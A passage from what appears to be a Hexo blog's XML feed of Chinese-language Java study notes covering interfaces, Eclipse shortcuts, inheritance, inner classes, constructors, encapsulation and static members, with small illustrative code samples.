class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类被继承，接口被实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">implements</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methid1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//具体实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methid2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//具体实现</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">methid3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//具体实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>w单继承，多实现</li></ul><p><code>class Test extends 类 implements 接口1,接口2&#123;&#125;</code></p><ul><li>注意用什么类声明，什么类构造</li><li>接口也可以被接口继承</li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 接口 </tag>
            
            <tag> 多态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单使用Eclipse</title>
      <link href="/Programming/Java/day8_ide_eclipse.html"/>
      <url>/Programming/Java/day8_ide_eclipse.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>注意记录一些快捷键和一些欲哭无泪的事</p></blockquote><p>注意改成等宽字体，不然很难受</p><span id="more"></span><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><table><thead><tr><th>组合键</th><th>含义</th></tr></thead><tbody><tr><td><code>ctrl+shift+F</code></td><td>代码格式化</td></tr><tr><td><code>alt+方向左右</code>或<code>ctrl+PD/PU</code></td><td>切换项目卡</td></tr><tr><td><code>alt+方向上下</code></td><td>交换上下行位置</td></tr><tr><td><code>ctrl+/</code></td><td>将选中的行注释或取消注释</td></tr><tr><td><code>ctrl+shift+/或\</code></td><td>将选中注释或取消注释</td></tr><tr><td><code>ctrl+d</code></td><td>删除一行</td></tr><tr><td><code>ctrl+shift+O</code></td><td>自动引入包删除包</td></tr><tr><td><code>ctrl+F11</code></td><td>run</td></tr><tr><td><code>ctrl+alt+down/up</code></td><td>快速复制</td></tr><tr><td><code>ctrl+1</code></td><td>修复错误</td></tr></tbody></table><h3 id="eclipse编译环境"><a href="#eclipse编译环境" class="headerlink" title="eclipse编译环境"></a>eclipse编译环境</h3><p>下载对应版本，在eclipse设置即可</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> eclipse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解继承</title>
      <link href="/Programming/Java/day6_%E7%BB%A7%E6%89%BF.html"/>
      <url>/Programming/Java/day6_%E7%BB%A7%E6%89%BF.html</url>
      
        <content type="html"><![CDATA[<p> 使类与类之间有一定的联系</p><span id="more"></span><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>使一个类（子类）具有另一个类（父类）的功能</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>当不同的类使用相同的成员变量/方法时，可以将相同的变量/方法放在其他类，简化代码，方便维护</p><p>例子(定义+使用)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//定义一个人的类，有年龄名字，和吃饭的行为</span></span><br><span class="line"> <span class="number">2</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"> <span class="number">3</span>     <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"> <span class="number">4</span>     <span class="keyword">private</span> String name;</span><br><span class="line"> <span class="number">5</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="number">6</span>         System.out.println(<span class="string">&quot;吃饭&quot;</span>);</span><br><span class="line"> <span class="number">7</span>     &#125;</span><br><span class="line"> <span class="number">8</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="number">9</span>         <span class="keyword">return</span> age;</span><br><span class="line"><span class="number">10</span>     &#125;</span><br><span class="line"><span class="number">11</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line"><span class="number">12</span>         <span class="keyword">this</span>.age = age;</span><br><span class="line"><span class="number">13</span>     &#125;</span><br><span class="line"><span class="number">14</span>     <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">15</span>         <span class="keyword">return</span> name;</span><br><span class="line"><span class="number">16</span>     &#125;</span><br><span class="line"><span class="number">17</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line"><span class="number">18</span>         <span class="keyword">this</span>.name = name;</span><br><span class="line"><span class="number">19</span>     &#125;</span><br><span class="line"><span class="number">20</span> &#125;</span><br><span class="line"><span class="number">21</span> <span class="comment">//定义一个学生，继承人，他本身有小名，学习的行为</span></span><br><span class="line"><span class="number">22</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="number">23</span>     <span class="keyword">private</span> String childboodName;</span><br><span class="line"><span class="number">24</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">learn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">25</span>         System.out.println(<span class="string">&quot;学习&quot;</span>);</span><br><span class="line"><span class="number">26</span>     &#125;</span><br><span class="line"><span class="number">27</span>     <span class="function"><span class="keyword">public</span> String <span class="title">getChildboodName</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="number">28</span>         <span class="keyword">return</span> childboodName;</span><br><span class="line"><span class="number">29</span>     &#125;</span><br><span class="line"><span class="number">30</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setChildboodName</span><span class="params">(String childboodName)</span></span>&#123;</span><br><span class="line"><span class="number">31</span>         <span class="keyword">this</span>.childboodName = childboodName;</span><br><span class="line"><span class="number">32</span>     &#125;</span><br><span class="line"><span class="number">33</span> &#125;</span><br><span class="line"><span class="number">34</span> <span class="comment">//使用</span></span><br><span class="line"><span class="number">35</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtendsDemo</span></span>&#123;</span><br><span class="line"><span class="number">36</span>     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"><span class="number">37</span>         Student a = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="number">38</span>         a.setAge(<span class="number">18</span>);</span><br><span class="line"><span class="number">39</span>         a.setName(<span class="string">&quot;明明&quot;</span>);</span><br><span class="line"><span class="number">40</span>         a.setChildboodName(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line"><span class="number">41</span>         System.out.println(a.getName()+<span class="string">&quot;-&quot;</span>+a.getAge()+<span class="string">&quot;-&quot;</span>+a.getChildboodName());</span><br><span class="line"><span class="number">42</span>     &#125;</span><br><span class="line"><span class="number">43</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><ul><li>在子类的构造方法里面使用<code>super()</code>可以调用父类里面的构造方法</li><li><code>super()</code>必须写在子类构造方法的第一句</li><li>实际上super还可以调用成员，如果成员公开</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>不支持多继承，即一个类只能继承一个类（关系纯洁??）</li><li>子类继承了父类的成员<ul><li>子类不能访问父类的私有成员</li><li>子类拥有父类的私有成员，不能直接访问</li></ul></li><li>“是一个”关系，比如学生是人，不能说人是学生</li><li>当子类和父类有重名变量时，谁近就访问谁，通过this，super可指定具体的变量</li><li>通过子类的构造方法构造对象时，都会调用父类的构造方法<ul><li>对父类进行初始化，不指定则调用默认的构造方法</li><li>如果设置了有参构造方法时，系统默认的无参构造方法就没有了</li></ul></li><li>一个类里面的方法可以相互调用，构造方法之间可以通过this()相互调用（不能与super()重复）</li></ul><h3 id="方法覆盖-重写-override"><a href="#方法覆盖-重写-override" class="headerlink" title="方法覆盖/重写(override)"></a>方法覆盖/重写(override)</h3><p>当子类的方法与父类的方法重名(指参数，方法名，返回值)时，则优先使用子类的方法</p><ul><li>这个方法不能设置成私有的，会说权限不够</li></ul><h2 id="方法重载-overload-与重写-override"><a href="#方法重载-overload-与重写-override" class="headerlink" title="方法重载(overload)与重写(override)"></a>方法重载(overload)与重写(override)</h2><table><thead><tr><th>方法重写</th><th>方法重载</th></tr></thead><tbody><tr><td>子类和父类</td><td>一个类</td></tr><tr><td>参数，返回值，方法名一样</td><td>方法名+参数不一样</td></tr></tbody></table><h2 id="final修饰符"><a href="#final修饰符" class="headerlink" title="final修饰符"></a>final修饰符</h2><p>可以与public，private修饰符一起用</p><h3 id="1-修饰类"><a href="#1-修饰类" class="headerlink" title="1.修饰类"></a>1.修饰类</h3><p>表示这个类无法被继承</p><h3 id="2-修饰方法"><a href="#2-修饰方法" class="headerlink" title="2.修饰方法"></a>2.修饰方法</h3><p>表示这个方法不能被子类重写</p><h3 id="3-修饰变量"><a href="#3-修饰变量" class="headerlink" title="3.修饰变量"></a>3.修饰变量</h3><ul><li><code>final int a=10;</code></li></ul><p>则该变量后面不能被赋值（变成常量）</p><ul><li><code>final int a;</code></li></ul><p>可以被赋值一次</p><h2 id="类包package"><a href="#类包package" class="headerlink" title="类包package"></a>类包package</h2><p>在开发大项目时，难免会遇到类名重复的问题，所以可以使用包类进行管理类</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>在开头写上<code>package xx.xx.xx</code></p><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><ul><li>习惯上以域名开头<ul><li>com.xx.xx</li></ul></li></ul><h3 id="终端编译"><a href="#终端编译" class="headerlink" title="终端编译"></a>终端编译</h3><p><code>javac -d . src.java</code></p><p><code>-d</code>指定编译根目录</p><h2 id="访问权限修饰符"><a href="#访问权限修饰符" class="headerlink" title="访问权限修饰符"></a>访问权限修饰符</h2><table><thead><tr><th></th><th>public</th><th>protected</th><th>default</th><th>private</th></tr></thead><tbody><tr><td>同类</td><td>yes</td><td>yes</td><td>yes</td><td>yes</td></tr><tr><td>同包</td><td>yes</td><td>yes</td><td>yes</td><td>no</td></tr><tr><td>子父类</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr><tr><td>不同包</td><td>yes</td><td>no</td><td>no</td><td>no</td></tr></tbody></table><ul><li>对类的修饰只有<code>public</code>和<code>default</code>，因为类分为包内包外（内部类除外）</li></ul><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><p>类中再定义一个类就是内部类，此类相对来说就是外部类</p><ul><li>内部类可以访问外部类的所有成员</li><li>外部类不能访问内部内的所有成员，因为他们是一对多的关系，外部类不知道是那个类的成员</li><li>内部类依附外部类而存在</li><li>非静态内部类不能声明静态成员</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line">外部类.内部类 对象 = <span class="keyword">new</span> 外部类().new 内部类();</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line">外部类 对象 = <span class="keyword">new</span> 外部类();</span><br><span class="line">外部类.内部类 对象 = <span class="keyword">new</span> 内部类();</span><br></pre></td></tr></table></figure><h3 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h3><p>在方法里面创建类就叫局部内部类</p><h3 id="匿名内部类JDK8"><a href="#匿名内部类JDK8" class="headerlink" title="匿名内部类JDK8"></a>匿名内部类JDK8</h3><p>当类只需要使用一次时，写成一个类有点浪费，于是有了匿名内部类</p><p>比如实现接口的功能只需要用一次时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Product</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getPrice</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">innerClass</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.println(</span><br><span class="line">            <span class="comment">//因为没有名字，所以叫匿名内部类</span></span><br><span class="line"><span class="keyword">new</span> Product()&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getPrice</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;笔&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;.getName</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InnerClass</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Vehicle f)</span></span>&#123; </span><br><span class="line">        f.transit();</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        test(</span><br><span class="line">            <span class="keyword">new</span> Vehicle()&#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transit</span><span class="params">()</span></span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">                &#125;   </span><br><span class="line">            &#125;   </span><br><span class="line">        );</span><br><span class="line">        test( () -&gt; </span><br><span class="line">                System.out.println(<span class="string">&quot;test&quot;</span>)    </span><br><span class="line">            );</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Vehicle</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transit</span><span class="params">()</span></span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>匿名内部类也可以传递参数，参数参照父类的构造方法</p></blockquote><h3 id="重名"><a href="#重名" class="headerlink" title="重名"></a>重名</h3><p>当外部类和内部类重名时，访问遵循就近原则，若想访问特定的成员，可以使用<code>类名.this.成员</code>进行访问</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法重载 </tag>
            
            <tag> 方法重写 </tag>
            
            <tag> 内部类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理解类和对象</title>
      <link href="/Programming/Java/day5_%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1.html"/>
      <url>/Programming/Java/day5_%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<p>类就是一个模板，将模板实例就是对象</p><span id="more"></span><h2 id="类class"><a href="#类class" class="headerlink" title="类class"></a>类class</h2><p>类里面有成员变量和成员方法</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>例子(public class只能有一个)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">成员变量;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">practice</span><span class="params">()</span></span>&#123;</span><br><span class="line">方法体;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>成员变量可以不初始化</p><ul><li>自动默认值</li></ul><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>通过类创建的变量就叫对象</p><h3 id="声明-初始化"><a href="#声明-初始化" class="headerlink" title="声明+初始化"></a>声明+初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类名 对象=<span class="keyword">new</span> 类名();</span><br></pre></td></tr></table></figure><p>new相当于初始化</p><blockquote><p>new才会分配内存空间（堆），然后进行初始化数据 </p></blockquote><p><code>对象.成员变量/方法</code>可以访问类的变量和方法</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>除了一般使用对象还可以作为成员变量存在于另一个类里面</p><h2 id="面向对象和面向过程"><a href="#面向对象和面向过程" class="headerlink" title="面向对象和面向过程"></a>面向对象和面向过程</h2><ul><li><p>面向过程就像做事一步一步完成(C)</p></li><li><p>面向对象就像操作不同的职位进行管理(Java,c#…)</p></li><li><p>面向对象可以让程序更加有条理性，是更好的程序表达</p></li></ul><h2 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h2><table><thead><tr><th>成员变量</th><th>局部变量</th></tr></thead><tbody><tr><td>定义在<strong>类</strong>里面</td><td>定义在<strong>方法</strong>里面</td></tr><tr><td>只有在<code>new</code>(自动初始化)时才占用内存</td><td>调用方法才占用空间</td></tr><tr><td>数据在<strong>堆</strong>里面</td><td>数据在<strong>栈</strong>里面</td></tr><tr><td>通过GC回收</td><td>方法调用完即释放内存</td></tr></tbody></table><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><p>垃圾回收(Garbage Collection)是Java虚拟机(JVM)垃圾回收器提供的一种用于在空闲时间不定时回收<strong>无任何对象引用的对象</strong>占据的内存空间的一种机制</p><p><a href="https://www.jianshu.com/p/5261a62e4d29">参考</a></p><h2 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h2><p>直接使用new出的对象就叫匿名对象，通常只调用一次时才会使用匿名对象</p><p>如<code>new 类名();</code></p><p> 可以作为参数使用</p><p>如<code>new ClassName1().method(new ClassName2());</code></p><blockquote><p>匿名对象不会在栈分配空间，而是直接在堆里分配空间，所以调用完毕会立马被GC回收</p><p>而有名字的对象由于在栈里有空间，所以要等方法调用完才会被清理，当它调用一个匿名对象时，匿名对象也会存活久一些</p></blockquote><h2 id="修饰符public和private"><a href="#修饰符public和private" class="headerlink" title="修饰符public和private"></a>修饰符public和private</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><ul><li>在类里使用public和private修饰成员变量和成员方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> test;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>public代表公开，允许其他类使用</li><li>private代表私有，不允许其他类使用</li></ul><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ul><li>提高容错率</li><li>也就是让程序更加健壮</li></ul><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2><p>功能：方便初始化</p><p>说明：当我们new一个新对象时，系统会根据类型自动初始化（默认的构造方法），而我们想要初始化成自己的数据时就不得不使用<code>对象名.成员=value</code>来初始化，于是我们可以自定义构造方法来进行初始化</p><p>操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line">String b;</span><br><span class="line">    <span class="comment">//无参初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化操作</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//有参初始化，参数不同，方法不同</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">(<span class="keyword">int</span> _a,String _b)</span></span>&#123;</span><br><span class="line">a=_a;</span><br><span class="line">b=_b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//此时有了两种构造方法</span></span><br><span class="line">Test a = <span class="keyword">new</span> Test();</span><br><span class="line">Test a = <span class="keyword">new</span> Test(<span class="number">13</span>,<span class="number">14</span>);</span><br></pre></td></tr></table></figure><ul><li>一般修饰符是public</li><li><strong>单例模式</strong>用到private</li></ul><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>功能：代表当前对象，实用上就是方便见名知意</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line">String b;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//初始化操作</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//此时重名就不会有影响</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">(<span class="keyword">int</span> a,String b)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.a=a;</span><br><span class="line">        <span class="comment">//成员参数</span></span><br><span class="line"><span class="keyword">this</span>.b=b;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//还可以this.方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>是一种编程思想，让程序更加安全</p><p>做法</p><ul><li>将类的成员变量全部设置为private，不让外界直接接触</li><li>若要查看某成员，提供get方法</li><li>若要编辑，提供set方法(慎用)</li></ul><h2 id="static修饰"><a href="#static修饰" class="headerlink" title="static修饰"></a>static修饰</h2><ul><li>可以修饰成员变量和成员方法</li><li>通过成员和类都可以调用，调用的是同一串数据</li><li>修饰成员变量表示静态变量，静态变量是所有对象共有的，<strong>只占一份空间</strong></li><li>修饰成员方法表示静态方法，<strong>静态方法只能访问静态变量/方法</strong>，访问非静态变量时会不知道对象，传递一个对象参数才能访问成员变量</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String country;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(<span class="keyword">int</span> age,String country)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.country = country;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticDemo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Person a = <span class="keyword">new</span> Person(<span class="number">13</span>,<span class="string">&quot;China&quot;</span>);</span><br><span class="line">    Person b = <span class="keyword">new</span> Person(<span class="number">15</span>,<span class="string">&quot;America&quot;</span>);</span><br><span class="line">        System.out.println(a.age+<span class="string">&quot;-&quot;</span>+a.country);</span><br><span class="line">        System.out.println(b.age+<span class="string">&quot;-&quot;</span>+b.country); </span><br><span class="line">        <span class="comment">//使用“类名.静态变量”也可以访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[manu@MY day5 07:33 下午]$ java StaticDemo </span><br><span class="line">13-America</span><br><span class="line">15-America</span><br></pre></td></tr></table></figure><h3 id="解释原理图"><a href="#解释原理图" class="headerlink" title="解释原理图"></a>解释原理图</h3><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/static原理.png" style="zoom:50%;" /><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><ul><li><p>当多个对象使用同一个一模一样的成员时，使用静态变量可以节约内存空间</p></li><li><p>非静态成员可以访问静态成员</p></li></ul><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>1.随着类的加载而加载</p><p>2<strong>.优先于对象，也就是说并不需要创建对象才能使用</strong></p><p>3.所有对象共享，可以通过对象或者类进行访问</p><h3 id="实际运用"><a href="#实际运用" class="headerlink" 